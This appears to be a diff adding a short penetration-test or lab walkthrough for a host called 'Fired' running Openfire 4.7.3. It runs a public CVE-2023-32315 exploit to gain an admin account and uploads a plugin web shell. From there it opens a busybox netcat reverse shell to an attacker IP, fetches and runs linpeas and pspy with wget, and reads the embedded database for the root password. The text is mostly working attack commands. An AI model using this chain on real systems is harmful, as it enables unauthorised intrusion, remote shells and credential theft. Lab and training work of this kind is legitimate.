@@ -1,0 +1,42 @@
+Fired 
+192.168.245.96
+
+http://192.168.245.96:9090/login.jsp?url=%2Findex.jsp
+admin admin failed
+
+ Openfire, Version: 4.7.3
+ https://github.com/miko550/CVE-2023-32315
+ git clone https://github.com/miko550/CVE-2023-32315.git 
+ cd CVE-2023-32315
+ pip3 install -r requirements.txt
+python3 CVE-2023-32315.py -t http://192.168.245.96:9090
+
+http://192.168.245.96:9090 username: oxsnjo password: ihe41x
+
+    Run exploit
+    login with newly added user
+    goto tab plugin > upload plugin openfire-management-tool-plugin.jar
+    goto tab server > server settings > Management tool
+    Access websehll with password "123"
+
+http://192.168.245.96:9090/plugins/openfire-management-tool-plugin/cmd.jsp?action=command
+whoami
+busybox nc 192.168.45.173 4545 -e /bin/bash
+Got shell
+/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
+wget http://192.168.45.173:440/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+
+wget http://192.168.45.173:440/pspy64
+chmod +x pspy64
+./pspy64
+
+Fond nothing interesting 
+start manual search
+
+/usr/share/openfire/embedded-db
+cat openfire.script
+Find the root password 
+
